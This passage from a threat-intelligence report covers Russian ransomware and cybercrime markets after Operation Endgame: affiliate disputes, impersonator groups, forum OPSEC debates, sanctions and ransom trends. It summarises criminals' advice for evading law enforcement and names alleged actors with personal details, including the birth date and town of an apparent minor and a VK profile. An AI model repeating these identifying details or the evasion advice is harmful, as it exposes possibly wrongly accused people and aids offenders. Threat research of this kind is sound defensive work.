margins up where risk is justified.Repeated attacks on the same victims are forbidden. Anti-collision policies protect negotiation credibility and reduce noise that draws attention from law enforcement and platforms — an internal norm that sustains the business under scrutiny.The above-mentioned restrictions were likely put in place due to the frequent scam attempts and a number of unqualified RaaS affiliate members. On August 11 and 12, 2025, the threat actor “MikeMelton”, a member of CHAOS Ransomware Group, on the forum Ramp, posted that previously, this kind of forum was a privileged place to conduct business and required a perfect reputation and vouching from other credible dark web community members. However, recently, businesses such as hacking and carding started attracting a lot of unskilled and inexperienced individuals or agents, which makes all business threads immediately public; that is why members stopped sharing their experience. It is currently a place for trade and scammers. According to the threat actor, the reputation is based only on a deposit on forums, but not on real activity. This lament captures the structural shift: reputational gatekeeping has degraded under pressure, so markets default to financial collateral and closed-channel vetting. In Dark Covenant terms, as state tolerance grows more conditional and external pressure rises, underground threat actors self-regulate with higher costs and tighter circles, thus sacrificing openness for survivability. MikeMelton posted their opinion regarding the current dark web community reputations and developments; the post was translated using Google Translate (Source: Ramp Forum)Examples of Increase or Decrease in Trust Among RaaS Affiliate MembersSince 2024, we have observed posts on dark web forums where threat actors complained about participating in RaaS affiliate programs, stating that ransomware owners scammed them. This erosion of trust reinforces the shift from open advertisements to closed, collateralized recruitment consistent with the covenant’s self-protective logic.Qilin RaaS Affiliate Member DisputeOn July 22, 2025, the threat actor “hastalamuerte” on the forum Ramp filed a complaint against “Haise”, an operator and representative of Qilin Ransomware Group on criminal sources. hastalamuerte accused Haise of not paying them their portion of the ransom. The threat actor stated that their team was affiliated with Qilin Ransomware Group and that they targeted fourteen victims within the last one-and-a-half months. They stated that they had an agreement with Qilin Ransomware Group to receive $200,000 for these victims, but the support of Qilin suddenly disappeared, and hastalamuerte estimated a loss in profit of $48,000. This kind of public non-payment dispute erodes the perceived reliability of RaaS “platforms,” pushing operators toward tighter, collateralized, and culturally gated affiliate models consistent with the covenant’s self-protective logic.In response to the claim, Haise replied that hastalamuerte is affiliated with “DevManager” (threat actor “Devman”), who tried to work with Qilin and provided corporate networks. According to Haise, Devman has been publishing these victims before closing negotiations on their own extortion website, Devman Blog. Furthermore, Devman allegedly tried to steal the source code of Qilin ransomware and hire one of its developers. They also mentioned another “weird” affiliate member who targeted twenty entities and refused to publish them on Qilin’s extortion blog. hastalamuerte replied that they became a ransomware affiliate through a college of Devman and did not hide that they knew each other. The dispute was closed by the administration of Ramp Forum on July 31, 2025, without any negative consequences for Haise. Forum arbitration that favors the operator over the affiliate signals power asymmetry inside RaaS ecosystems and deters future whistleblowing, but it also accelerates the affiliate flight risk that operators then counter with deposits, KYC-lite checks, and closed recruitment.The conflicts between affiliate members and RaaS owners happened earlier. Among the most notable examples was the conflict between the currently disbanded ransomware group ALPHV and their former affiliate “notchy”.Emergence of Ransomware ImpersonatorsIn the second half of 2024 and in 2025, Insikt Group observed multiple instances of the emergence of ransomware group impersonators with pure scam intentions. Among these groups were RebornVC, Babuk 2.0, Bjorka Spirit (Ransomware), GD LockerSec, FunkSec, Dispossessor, and Rabbit Hole. The proliferation of impersonators dilutes brand credibility across the ecosystem, accelerates “trust flight” to closed circles, and raises acquisition costs for legitimate affiliates — outcomes that align with the Dark Covenant’s shift from open markets to tightly managed, state-tolerated networks.For example, on January 26, 2025, Babuk ransomware v. 2.0 was released on the dark web and included an announcement for their affiliate program. The threat group released the primary terms and conditions of the program, indicating the threat group does not target hospitals (except private plastic surgeries and dental clinics), any non-profit charitable foundations, schools (except major universities), or small businesses (companies with less than $4 million in annual revenue). It is worth mentioning that analysis of the victims posted on the extortion website revealed that 90% of the victims had already been listed by other ransomware groups. According to GuidePoint’s Research and Intelligence Team (GRIT), out of 64 victims initially listed by the ransomware operators on the extortion website, 26 victims had been listed by FunkSec Group, 26 victims by RansomHub Ransomware Group, and four by LockBit 3.0 Ransomware Group. Recycled victim lists suggest opportunistic “signal hijacking,” eroding the informational value of leak websites and undermining extortion leverage — another force pushing operators toward curated channels and vetted partnerships.In January 2025, Babuk 2.0 ransomware operators announced their cooperation with the threat actor “Bjorka” (same time as GD LockerSec Ransomware Group). These fluid “partnership” claims function as reputational arbitrage: impersonators borrow brand equity to lure affiliates and victims, while real operators respond by tightening verification and provenance checks. Almost immediately in January 2025, Insikt Group observed an increase in Telegram activities associated with “Bjorka Spirit (Ransomware)”, a purported ransomware group that is operated by the threat actor Bjorka. We assess that Bjorka does not operate a ransomware group, but performs hacking and data leak activities; however, the Telegram group indicates active cooperation between Bjorka and ransomware group operators such as Babuk Locker 2.0, GD Locker, FunkSec, and more.Insikt Group identified further discussions on the dark web regarding the threat actor “SkyWave”, an alleged member of Babuk 2.0 Ransomware Group, where users claimed that the monikers SkyWave, “Bjorkanism”, and “BabukLocker” are all used by the same individual, Aditya Dani Herlambang. Aditya was born on March 17, 2009, is male, and possibly located in Pangkot, Manado Sulawesi Utara, Indonesia.We assess that all these threat groups are operated by the same cybercriminal team that constantly publishes already leaked data on the dark web. Telegram banned multiple Telegram channels operated by the above-mentioned groups due to the violation of its Terms of Service (ToS); however, Telegram’s low-entry barriers enable rapid rebranding and audience capture, which inflates noise and further incentivizes serious threat actors to migrate negotiations off public channels.From May 2024, Insikt Group observed more examples of ransomware and data extortion groups publishing or reselling already compromised data, such as the currently defunct Dispossessor Ransomware Group (primarily reposting LockBit 3.0’s victims) and Rabbit Hole Blog (reselling already leaked data from various ransomware groups). Impersonation and resale schemes are market noise that strengthens the case for smaller, protected constellations of threat actors — those most likely to be legible to domestic protectors and least exposed to Western pressure.Internal Perception and Community DiscussionOperational Security DiscussionThroughout both the 2024 and 2025 iterations of Operation Endgame, Insikt Group has observed numerous threads on high-tier forums such as Exploit and XSS discussing the takedowns and arrests, particularly with regard to law enforcement deanonymization techniques, recommended operational security changes, and risk calculus for participating in MaaS projects. Insikt Group observed users increasingly urging each other to move to decentralized messaging platforms, citing that centralized communications platforms and email providers comply with law enforcement. Multiple users recommended moving communications from Telegram to platforms such as Session, Jabber, and Tox, though numerous users also cited vulnerabilities in Tox, such as IP address leaking between users. Insikt Group also observed several threads discussing the security of the Tor browser, with one thread expressing skepticism about updates to the browser, Whonix, and Qubes, and other guides published regarding how to use the browser safely. Many users recommend a multi-layer approach to operational security, including the use of Tails, virtual machines, Tor browser, and neighbors’ Wi-Fi networks rather than one’s own. We also observed threads specifically posing the question of protecting data on computers and mobile phones in the case of seizure by law enforcement, with multiple users suggesting the use of VeraCrypt hidden volumes to secure hard drives. Users also compared the security of various mobile operating systems and manufacturers’ willingness to unlock seized devices, with most users agreeing that trusting iOS and Android should be avoided, and several users recommending GrapheneOS instead, with still others dismissing having a smartphone at all as being insecure and insisting on using older burner phones only.Analytically, this OPSEC pivot reflects the Dark Covenant in practice: when state tolerance becomes conditional and Western pressure rises, threat actors reduce centralized exposure, raise the technical bar to entry, and privilege in-group channels, trading scale for survivability. These adaptations increase transaction costs for affiliates (deposits, vetting, and toolchains) and fragment visibility for defenders, but they also create new error surfaces (misconfigured Tox, Tor hygiene lapses, and burner OPSEC) that can be exploited. The net effect is a shift from mass, open coordination toward smaller, semi-closed constellations that are more legible to domestic protectors and harder for outsiders to infiltrate.Concurrent to Operation Endgame, Russian law enforcement engaged in arrests of various ransomware threat actors, including those related to REvil. Within the leaked BlackBasta chats, one of the group members highlighted a REvil-related arrest that occurred in November 2023. As a result, the threat group wiped the wallets and other data they had shared with the arrested REvil threat actor, indicating some fear of further Russian law enforcement actions. This reaction underscores the covenant’s “governed market” dynamic: selective domestic pressure is credible enough to compel precautionary hygiene (wallet purges and compartmentation) without dismantling core ecosystems, reinforcing a conditional safe haven that Moscow can tighten or loosen to manage risk and influence behavior.Lumma Disruption DiscussionIn another thread discussing Operation Endgame, which resulted in the takedown of Lumma Stealer infrastructure, multiple users expressed uncertainty in the security of the MaaS model, citing that the operation was openly targeting Lumma affiliates and customers, rather than only the developers and operators of the malware. Multiple users stated that the only way to operate is to write your own stealers and malware and store your own data privately, stating that users should not trust “public” commodity malware providers like Lumma. The user “Theriella” stated that Lumma developers are likely safe due to their presence in Russia, and that although this likely means that they need to give a cut to the “structures” (likely institutions such as law enforcement), it was still better than operating on US territories; another user countered by saying that eventually “money will run out and your own will eat you to the bone.” This debate captures the Dark Covenant tradeoff: commodity MaaS maximizes scale but invites cross-border exposure, while “write-your-own, keep-your-own-data” models shrink visibility and re-center protection on domestic ties — especially if developers can “tax” themselves to local structures for cover. The perception that Russia-based developers are safer, even if they share proceeds with “structures,” reinforces a governed-market logic in which proximity to protectors substitutes for platform trust.Several users also claimed that despite the disruption, Lumma “went private” via closed channels, which aligned with observations from researchers of continued infections and log availability. Notably, as of September 2025, Lumma has appeared to resume public-facing operations with an August 29, 2025, post on Ramp Forum releasing updates to Lumma, with inclusion of a link tree (usrlnk[.]io/lumma) as well as a Telegram handle ([@]lummaseller128) for purchasing access to the panel. This oscillation, from public to private and back, illustrates resilience patterns common in covenant-aligned ecosystems: close ranks under pressure, monetize quietly while the situation is intense, then re-emerge when enforcement attention shifts. For defenders, it implies that takedowns depress liquidity temporarily but do not eliminate capability; for policymakers, it signals that durable impact requires sustained pressure on both operators and the domestic incentives that enable their return.Discussions of Charged IndividualsIn addition to analyzing individual threads, Insikt also tracked user activities of individuals implicated in Operation Endgame and discussions of their forum activities. We observed that several users named by the operation, such as “Jimmbee” (Aleksandr Stepanov), “psevdo”, and Chuck, remain members of their respective forums and have not been banned by administrators. Other users, such as the developer of Lumma (“Shamel”), were banned on the forum per their own request. The continued presence of named users, absent universal bans, signals that underground governance prioritizes utility and reputation over external designations, reinforcing the covenant’s logic that social capital and perceived protection can offset public exposure.Users on Exploit and XSS forums also shared their thoughts regarding the fate of individuals named and arrested in the campaigns. In a thread about the DanaBot takedown and arrests during Operation Endgame, user Theriella wrote about the possibility of suspects being recruited by either the American or Russian government, claiming that in the latter case, they will be “forced to work for the government in a golden cage with a collar.” This “golden cage” narrative aligns with Dark Covenant dynamics: selective coercion converts high-skill criminals into semi-deniable assets, preserving capability while tightening state leverage. The same thread discussed operational security mistakes that arose as a result of a memory leak vulnerability in DanaBot code itself, which leaked threat actor usernames, IP addresses, command-and-control (C2) infrastructure domains and addresses, private keys, and more. In a separate XSS thread discussing the 2024 operation, users analyzed Operation Endgame’s videos posted to the takedown website, discussing which usernames are linked to an individual, or theorizing about what law enforcement knows about various individuals and who is a “rat” that led to the arrests.Attribution speculation and “rat” hunting fragment trust and push threat actors toward tighter compartmentation, consistent with the shift from open forums to curated circles. Another user, “Asist”, commented that the account associated with SmokeLoader (“SmokeLdr”) should be banned for security reasons, though as of September 2025, the account remains on the forum. The reluctance to ban legacy brands underscores the weight of reputation and revenue potential even amid security concerns.Discussions of the law enforcement operations themselves also seemed to spur more existential discussions on the forums around the cost-benefit analysis of engaging in financially motivated cybercrime at all. In one thread on Exploit Forum, the user “RichAsHell” commented on the difficulty of netting high profits via cybercriminal activity, particularly for those just starting out, stating that the risk of decades in prison makes working in “white” (non-criminal enterprise) to make comparable profits more appealing. This reevaluation reflects rising transaction costs (deposits, stricter vetting, closed channels) and elevated perceived risk — clear downstream effects of Operation Endgame and conditional domestic enforcement. The topic was controversial among Exploit users, with some claiming that cybercrime was more profitable than any “white” work in former CIS countries, or other financially struggling economies such as those in Africa and Southeast Asia, especially outside of major cities.Economic grievance narratives help sustain recruitment despite higher risk, but they also push operators to professionalize and centralize control over who participates. The user “Ex0rci$t” commented that at the inception of Exploit, there was no criminal punishment for carding within the Criminal Code of the Russian Federation, citing the uncertainty around further criminalization of forum activities within Russia. This legal uncertainty is a feature of the covenanted space: ambiguity preserves state flexibility to pressure or protect as needed, maintaining leverage over the market while avoiding categorical commitments.Transnational Policy Changes in a Post-Operation Endgame EnvironmentWestern governments continue to evolve in their policies toward ransomware, mainly taking a proactive stance and implementing disclosure guidelines so that law enforcement and governments can actually measure the ransomware threat. This shifts the external environment from episodic disruption to continuous measurement and pressure, raising the cost of doing business for Russia-based ecosystems while illuminating where domestic protection sustains activity despite exposure.While this is happening, the US and Russia have engaged in diplomatic efforts that have resulted in the release of multiple sentenced Russian cybercriminal threat actors (Alexandr Vinnik, Roman Seleznev, and Vladislav Klyushin), which might imply that if an incarcerated threat actor is significant enough, they can weigh this as an option in their negotiations. Klyushin and Seleznev were released in August 2024 as part of a multinational exchange. Klyushin had been arrested for his role in a securities scheme where Klyushin and others hacked into computer networks to steal confidential corporate information that was used to make $93 million in profits through the stock market. Klyushin was likely released due to his company’s contracts with the Kremlin and one of his codefendants being a GRU officer who was involved in hacking the Democratic National Committee in 2016. Roman Seleznev, who was associated with various hacking and payment card fraud schemes, was likely released because he is the son of Russian Duma member Valery Seleznev. Alexander Vinnik was released in February 2025 and had pleaded guilty to laundering billions of dollars in cryptocurrency. Prior to Vinnik’s arrival back in Russia, the Russian Ministry of Internal Affairs had its own investigation to stop his extradition to the US. Due to the prisoner exchange, Russia removed the criminal case against him, and he was freed upon his return to Russia. These swaps underscore how high-value threat actors function as geopolitical assets; the possibility of exchange or protection reduces deterrence for elites and reinforces the covenant’s logic that proximity to state power can offset foreign legal risk.Since the beginning of Operation Endgame, multiple ransomware attacks originating from Russia continued targeting Western entities, which forced the governments of many countries to reassess their approach toward ransomware payments, negotiations with ransomware operators, reporting procedures, and identifying key adversaries. Below is a list of the major legislative changes for the past years in the US and in some other highly targeted countries. In 2025, the US signed two presidential orders (1, 2) to reinforce the cybersecurity posture that protects the US’s internet and telecommunications infrastructure. The law also allows the US government to take more effective actions against state-sponsored cyberattacks orchestrated by the governments of Russia, China, Iran, and North Korea, and implies the development of minimum cybersecurity standards for government technology contractors with a primary focus on China. By formalizing authorities and standards, Western states are narrowing the gray space in which state-tolerated criminal actors operate, making it harder for Russia-based threat groups to rely solely on domestic protection while transacting internationally.In addition, Japan is moving to a more offensive cyber approach. On May 16, 2025, Japan implemented a new Active Cyberdefense Law that permits the authorities of Japan to perform offensive cyber operations regarding hostile infrastructure and adversaries, including infiltrating and neutralizing hostile servers before any malicious activity has taken place, and decreasing the level of attacks on Japan. This normalization of preemptive action signals that the external pressure on Russia-based ecosystems will include active defense — not just post-incident cleanup — compressing the operational windows the covenant seeks to preserve.On May 31, 2025, Australia began enforcing new ransomware payment disclosure rules under the Cyber Security Bill 2024, requiring businesses with an annual revenue above $3 million AUD (USD $1.92 million) to report any ransom payments to the Australian Signals Directorate (ASD) within 72 hours. This legislation, while not making ransom payments illegal, mandates transparency to enhance the government’s insight into ransomware activity and inform future cybercrime legislation. Companies must report details such as their Australian Business Number, timing of the attack, whether data was stolen or encrypted, vulnerabilities exploited, the ransom amount and currency, and the financial impact on the business.On January 14, 2025, the UK government initiated an open consultation called “Ransomware: proposals to increase incident reporting and reduce payments to criminals” with a proposed launch date of April 8, 2025. According to the proposal, regarding a ban on all public sector bodies, including schools, the National Health Service (NHS), operators of Critical National Infrastructure (CNI), and local councils, from making ransomware payments. The proposals also include mandatory reporting of ransomware incidents, aiming to enhance transparency and improve response strategies. Previously, UK government departments were banned from paying ransoms to ransomware operators. That process is a part of the broader strategy to combat cybercrime and minimize the risk of financial losses and other damages to businesses and infrastructure. As of this writing, the legislation has not been implemented yet, but the published government response demonstrates a strong intention to proceed further with legislation in the foreseeable future.Payment visibility and bans reduce liquidity for RaaS ecosystems, raise negotiation risk, and weaken extortion leverage. This constrains the monetization channel that domestic protection alone cannot guarantee, pressuring Russia-based threat actors to adapt or lose profitability.Operational Adaptations by Russian CybercriminalsThroughout 2024 and 2025, Insikt Group has observed that Russian domestic policies and enforcement strategies have contributed to threat activity enablers’ (TAE) operational adaptations following sanctions and enforcement activities. Historically, such providers have operated with relative impunity due to weak domestic enforcement; however, the April 2025 arrests of Aeza Group executives Yuri Bozoyan, Maxim Orel, and Tatyana Zubova marked a departure from this trend. These arrests were linked to Aeza’s hosting of the darknet drug market BlackSprut, which had previously gained high visibility through public billboards in Moscow. This was a boundary enforcement event: when criminal infrastructure drifts into politically sensitive domains (domestic narcotics and public optics), tolerance narrows and the state signals costs — even if adjacent cyber or influence operations remain tolerated.The Aeza arrests were followed by a considerable loss of trust in the provider within the cybercriminal ecosystem, with multiple user complaints about downtime and payment suspensions surfacing on forums such as LolzTeam (which resulted in bans). Multiple other Russian TAEs, such as CloudBlast and VDSina, moved quickly to fill the vacuum left by Aeza, offering targeted “refugee services.” Additionally, the Western government announced sanctions against Aeza in July 2025, leading Aeza to adopt a dual structure: the company migrated its infrastructure to Serbian provider Smart Digital Ideas DOO while continuing to rely on Russian financial systems such as WebMoney, YooMoney, and Mir for payments.We assess that this likely reflects an attempt by Aeza to balance operations between enforcement strategies inflicted by both Western governments and Russian domestic law enforcement. Notably, Aeza had also been linked to hosting the pro-Kremlin disinformation campaign Doppelgänger, active in Europe since at least 2022. This indicates that while Russian authorities may tolerate and even use hosting services tied to cybercrime or disinformation, direct association with domestic narcotics distribution introduced political sensitivity that triggered intervention. The “dual structure” response is a typical covenant adaptation: externalize exposure (infrastructure migration abroad) while anchoring monetization at home, preserving access to domestic protection and payments, even as reputational and regulatory pressure increases.On the other hand, TAEs such as Stark Industries, Global Connectivity Solutions, Inferno Solutions (3NT), and Zservers demonstrated different adaptations in response to Western sanctions. Stark Industries pre-emptively migrated its Russian infrastructure to Moscow-based UFO Hosting in advance of EU sanctions, likely to ensure continuity for both domestic and international clients. Global Connectivity Solutions and Inferno Solutions have also maintained stronger domestic ties, continuing to use long-standing networks while insulating their operations through UK-registered fronts. Their resilience is supported by the domestic reality that Russian authorities have not targeted them, given their role in state-aligned disinformation and cyber operations rather than domestic narcotics markets. Stark Industries was also reportedly cooperative with Western law enforcement in Operation Endgame, with cybersecurity company Cymru claiming that PQ Hosting/Stark Industries was a “key partner and collaborator” in the takedown (the company has historically been observed to selectively cooperate with law enforcement requests, likely further contributing to their resilience). These heterogeneous strategies — preemptive repositioning, foreign façades, and selective cooperation — illustrate how TAEs navigate the covenant’s incentives. They remain useful to state priorities, avoid domestically sensitive red lines, and trade limited cooperation for operational continuity.Ransomware Adapts and Grows Despite External PressureThe primary trends Insikt Group observed since the beginning of Operation Endgame can be divided into two groups: those that continued to evolve from the previous report’s timeframe and new trends that significantly changed the ransomware threat landscape. These trends reflect a market seeking volume and dispersion to offset enforcement, while concentrating trust and protection where domestic cover is strongest. Among the primary evolution trends were the following:First, a stable growth in the number of new ransomware variants. For example, from May to December 2024, we identified at least 192 new ransomware variants. From January to September 2025, the number of new variants was 236. The majority of the variants originated from leaked source code and builders from existing ransomware families such as LockBit, CryLock, Xorist, Proton, GlobeImposter, Chaos, Makop, MedusaLocker, Djvu, Dharma, and more. We assess that this trend will continue and increase in volume. The launch of a new ransomware variant can and often does garner media attention, something that a threat actor or group may want at times. As threat groups gain knowledge in developing and deploying their own ransomware variants via leaked data, they will likely add this attack vector type to their TTPs. In some cases, Insikt Group observed that allegedly different ransomware variants used identical methods of communication, which indicates these threat actors have low credibility. Proliferation via leaked builders spreads capability without deep benches or protection, producing noisy “brands” that chase attention but lack credibility — an ecosystem-level adaptation that raises defenders’ triage burden while leaving core, protected crews comparatively insulated. To name a few examples:Root ransomware, Foxtrot ransomware, and Pomochit ransomware used identical email addresses (pomocit01@kanzensei[.]top and pomocit01@surakshaguardian[.]com).Destroy ransomware and AttackNew ransomware used identical email addresses (ithelp01@securitymy[.]name and ithelp01@yousheltered[.]com).Second, there has been a stable growth of new ransomware extortion websites. For example, from May 2024 to December 2024, Insikt Group identified 34 extortion websites, and from January 2025 to September 2025, 60 extortion blogs. More blogs diversify pressure channels and complicate takedowns but also fragment trust; serious operators respond by steering negotiations to curated venues, reinforcing closed-circle dynamics consistent with the covenant. Not all ransomware variants operate their own extortion blogs. Insikt Group assesses that it is relatively easy to create and deploy a new variant, but there is a bottleneck as to whether the variant is actually successful enough to obtain victim data for launching an extortion website.Third, ransomware focus has turned toward Asian countries. In 2024, India was the most targeted country in Asia and number seven in the world, with 100 listed victims on extortion websites. In June 2025, Israel became number four among the most targeted countries worldwide. However, it is likely that Israel was targeted more frequently than usual this month due to the conflict with Iran, which spurred a wave of opportunistic attacks by various cybercriminals. Shifts in geography reflect opportunism and political risk management: threat actors pursue high-yield targets while avoiding jurisdictions that threaten domestic protection or trigger disproportionate response.Fourth, new ransomware groups continue using pressure tactics to extort victims, such as distributed denial-of-service (DDoS) attacks or phone calls to victims to threaten them to pay ransom. These new RaaS groups will also continue hiring affiliate members openly, primarily via their extortion blogs or Telegram channels or forums, specifically Ramp Forum. Escalation tactics substitute for waning payment rates; open hiring persists at the edge of the market, while established brands tighten gates — dual tracks that balance volume with survivability.Fifth, operators of ransomware variants based on leaked source codes of notable ransomware brands widely adopted another pressure method: double ransom payments unless a victim pays a ransom within 24, 48, or 72 hours after a ransomware attack. Time-based penalties aim to compress negotiation windows before law-enforcement and regulatory friction can intervene, acknowledging a more hostile external environment.Sixth, existing ransomware groups continued to rebrand for security reasons. Rebranding serves as a reputational reset and legal smokescreen, enabling protected cores to shed heat while retaining talent, infrastructure, and state-aligned utility within the covenant’s protective boundaries.Changes in Ransomware TTPsSince May 2024, Insikt Group has observed different approaches in the business model of RaaS operators and changing TTPs. New approaches we observed are outlined in .Increase in Rivalries Between Ransomware GroupsDragon Force, RansomBay, and RansomHub ConflictIn April 2025, Insikt Group identified that Dragon Force Ransomware Group announced several controversial statements regarding its project ”DragonBay” and RansomHub Ransomware Group on the forum Ramp:On April 1, 2025, it was noticed that RansomHub Ransomware Group went offline and stopped operations. Some researchers stated that at least part of the threat group likely migrated to Qilin RaaS since the number of its victims almost doubled since February 2025. Qilin Ransomware Group was observed advertising a new RaaS version and hiring more affiliate members.Almost simultaneously, on April 2, 2025, the threat actor dragonforce released a statement that indicates that RansomHub likely joined their infrastructure and started cooperating.On April 25, 2025, dragonforce denied any attacks against RansomHub Ransomware Group on Ramp Forum. However, on April 28, 2025, the threat actor “koley”, a member of RansomHub Ransomware Group, claimed that Dragon Force Ransomware Group was responsible for the attack against RansomHub’s infrastructure and disruption to its operations. Also, they stated that they identified a traitor within RansomHub, an individual with the moniker “sarg0n” (possibly sarg0n, a member of Exploit and XSS forums) whose alleged name is “Дмитрий Игоревич Кудинов” with the VK account vk[.]ru/id6571635. Also, koley stated that Dragon Force Ransomware Group has contacts in the FSB, such as RansomHub. koley stated that the attack on RansomHub was a declaration of war between the two cybercriminal groups.Dragon Force: Possible Attacks on Everest, LockBit, BlackLock (Mamona) Ransomware GroupsOn March 18, 2025, Dragon Force Ransomware Group announced that it was operating as theDragon Force ransomware cartel, and 24 hours later, it was observed conducting DDoS attacks and defacements against competitors’ extortion websites, such as BlackLock Blog and Mamona Blog. Both websites are variants of El Dorado Ransomware Group and are operated by the same threat actor, “$$$”.Later, on April 5, 2025, the extortion website named “Everest Ransom Team” used by the ransomware group Everest went offline after being apparently hacked and defaced over the prior weekend. Victim listings on the website were replaced by the message “Don’t do crime CRIME IS BAD xoxo from Prague.” It is not clear whether the incident is legitimate or who may be behind it (the same message was posted by an unknown user to LockBit’s administrator affiliate panel — available in LockBit Leaked Chats), as law enforcement disruption operations, which have expanded in recent years, usually replace the websites they target with a splash page announcing the operation and identifying the agencies involved. The Everest blog defacement does not purport to come from a law enforcement agency, and no affiliates have been identified complaining about being “exit-scammed” on dark web forums. As of this writing, the extortion blog continues operating. However, it is possible that LockBit and Everest ransomware groups were targeted by Dragon Force.Impact on Payments, Target Strategies, and ProfitabilitySince the beginning of Operation Endgame and multiple other successful law enforcement operations worldwide, Insikt Group has analyzed reports and statistics related to the financial gains and losses of ransomware operators and identified that they have been receiving fewer ransom payments since 2024, and this trend is continuing in the first half of 2025. In addition, exploitation of vulnerabilities, phishing attacks, and attacks via malicious emails are primary attack vectors to infect victims with ransomware.Analysis of the reporting related to ransom payments indicates that the average ransomware payments in the first half of 2025 slightly decreased:Sophos released the report “The State of Ransomware” on June 30, 2025, which indicates that 32% of ransomware attacks resulted from vulnerability exploitation; data decryption rates decreased to 50% in 2025 (70% in 2024). Average (median) ransom demands decreased by 34% to $1,324,439, down from $2 million in 2024. Average (median) ransom payments dropped by 50% in 2025 ($1 million) from 2024 ($2 million).Coveware released a report on May 1, 2025, that indicates that an average ransom payment in Q1 2025 was $552,777 (-0.2% in comparison with Q4 2024). The median ransom payment in Q1 2025 was $200,000 (+80% in comparison with Q4 2024).Chainalysis reported on February 5, 2025, that in 2024, ransomware operators earned approximately $813.55 million in ransom payments, which indicates a 35% decrease from 2023, with $1.25 billion in ransom payments. Also, data leak websites posted more victims in 2024 than in any year prior; however, these data extortion websites often list already public information or repost from other sources to mislead and scam victims, law enforcement, and cybersecurity researchers. Another significant reason for that was likely the collapse of two major ransomware groups in 2024: LockBit 3.0 (“Operation Cronos,” February 2024) and ALPHV (which performed an exit scam in January 2024). Emerging ransomware groups cannot achieve the same scale of operations and market share as the above-mentioned variants.The Russian cybercriminal ecosystem is unlikely to contract — it will continue to reconfigure. We assess with high confidence that selective Russian enforcement will keep burning expendable monetization and infrastructure nodes while insulating high-utility operator circles, sustaining a conditional safe haven that adapts, rather than yields, to Western pressure. Over the next six to twelve months, Russian authorities will likely prioritize actions against low-utility enablers (such as cash-out brokers and politically sensitive hosting services tied to domestic optics) while avoiding decisive action against operators perceived to have intelligence or geopolitical value. Expect more Cryptex/UAPS-style cases and continued ambiguity around elite figures named in Western actions.Cash-out friction will rise as seizures, sanctions, and episodic Russian cases disrupt trusted rails, prompting diversification through mixers, OTC brokers, and friendly jurisdictions. The result is higher transaction costs and delays, not a collapse of revenue. In parallel, trust erosion on forums will continue to push recruitment and negotiations from open marketplaces into semi-closed circles that require deposits, KYC-lite checks, and cultural gating. Open RaaS advertisements will persist at the margins to feed volume, while credible brands harden gates to protect continuity.Business model churn will persist. We expect continued growth of data-extortion-only offerings, triple-extortion add-ons such as DDoS and call pressure, and investment-style affiliate schemes. Temporary privatization — going quiet under pressure, then resurfacing when attention shifts — will remain a common resilience pattern, as seen in commodity infostealer ecosystems. The net effect: shorter public exposure cycles and longer private monetization windows.OPSEC will get heavier but remain uneven. Threat actors will keep migrating off centralized platforms and stacking toolchains (Tails, virtual machines [VMs], and hidden volumes), yet usability gaps and misconfigurations will continue to create seams defenders can exploit — especially during affiliate onboarding, payment pivots, and communications transitions. At the same time, builder leaks and rapid rebrands will keep spawning numerous low-credibility variants and new blogs, driving overall volume up while reducing signal quality; a smaller core of protected threat actors will retain disproportionate impact amid the noise.Geography and target selection will remain politically bounded. Explicit carve-outs for CIS and BRICS and opportunistic swings tied to regional crises will endure, reflecting risk management inside the covenant. Threat actors will pursue high-yield opportunities while avoiding blowback in jurisdictions that endanger domestic cover. Western policy pressure will become more continuous as payment disclosures and bans expand, offensive authorities normalize, and multinational takedowns accelerate. Deterrence for elite operators will remain limited so long as swaps, lenient domestic outcomes, and political protection dilute perceived personal risk.For defenders and policymakers, the implication is clear: durable impact comes from pressure on the incentives of protection as much as on the criminals themselves. Prioritize choke points in cash-out and infrastructure; instrument continuous measurement to detect oscillation between public and private operations; focus on seams in affiliate onboarding and negotiation cycles; and align sanctions and law-enforcement actions with diplomatic levers that raise the domestic cost of protection. In a managed market, the covenant adjusts to shocks; only by reshaping the calculus that sustains protection can disruption scale and persist.Appendix A: Timeline of Russian Law Enforcement Events Related to CybercrimePossible Date of OperationOperational Activity- or Law Enforcement-Related EventDirectly Associated with Operation EndgameRussian authorities arrest Trickbot actor “Azot” (aka “Angelo”)Russian authorities detain “Bio” from the Conti Group for an unknown period of timeRussian authorities conduct raids and arrest 100 people associated with Cryptex and UAPSThe Russian government seizes $10 million in Bitcoin (BTC) from a former Investigative Committee (SKR) member as part of a bribery case tied to leaders of the Infraud ForumArrest of members associated with the Mamont banking trojanFour REvil threat actors are found guilty and sentenced to time served for trafficking in payment card data; Russian authorities also seize some money and property(Source: Recorded Future)Appendix B: List of New Ransomware TTPs Adopted after Operation EndgameHunters International:Hunters International was one of the first RaaS groups to publicly announce its switch to a data extortion model. On August 14, 2024, on its extortion website, Hunters International stated that the number of ransom payments significantly decreased, and the primary reason for that was not a specific affiliate member program or quality of ransomware. The primary reason for that was publicity. According to the threat actors, the only possible variant is to receive ransom to target critical infrastructure; however, if the authorities do not authorize the ransom payment, there is no chance of earning money. Hunters International Group decided to exfiltrate data and not deploy ransomware. After that announcement, Hunters International stopped displaying ransom notes and renaming encrypted files.Anubis RaaS:Anubis Ransomware Group used a different tactic to entice affiliates. In late February 2025, the threat group debuted an affiliate model that features two modes. On February 23, 2025, the threat actor “superSonic” advertised the Anubis RaaS affiliate program on the forum Ramp and introduced two models: ransomware and data exfiltration. The data exfiltration business model allows users to send exfiltrated data from companies to Anubis, who would then conduct the extortion process via their extortion blog.In addition to Hunters International and Anubis, BianLian Ransomware Group was also observed switching from ransomware to data extortion operations.Ransomware groups continued to strengthen their triple extortion techniques in addition to DDoS attacks and phone call services against already compromised victims. For example, on May 4, 2025, the threat actor Haise, a member of Ramp Forum and a member of Qilin Ransomware Group, announced that Qilin RaaS affiliate program was offering to its members an automated “call lawyer” service. According to the threat actor, the service includes the following options and benefits:A legal “assessment” of compromised dataA legal classification of the violations depending on specific jurisdictionsA legal assessment of potential lawsuits, their costs, and reputation damagesAbility to conduct negotiations for the victims directly with a lawyerA legal consultation regarding performing maximum damage to victims if they refuse to cooperateIn addition, on May 5, 2025, the ransomware group implemented additional features, such as a file-sharing storage with up to 1 TB of data capacity, a spamming tool, its own pool of “journalists” who, in cooperation with lawyers, can help to create texts for publication on the extortion blog as well as to help with ransomware negotiations.Investment Affiliate ProgramOn June 21, 2025, the threat actor “Nova”, on the forum Ramp, was hiring affiliate members for the new “Nova Access Investment Affiliate Program.” According to the threat actor, this investment affiliate program will be used for investment in the compromised network targeted by affiliate members. “The market value will be determined by the victim's ransom amount, depending on the 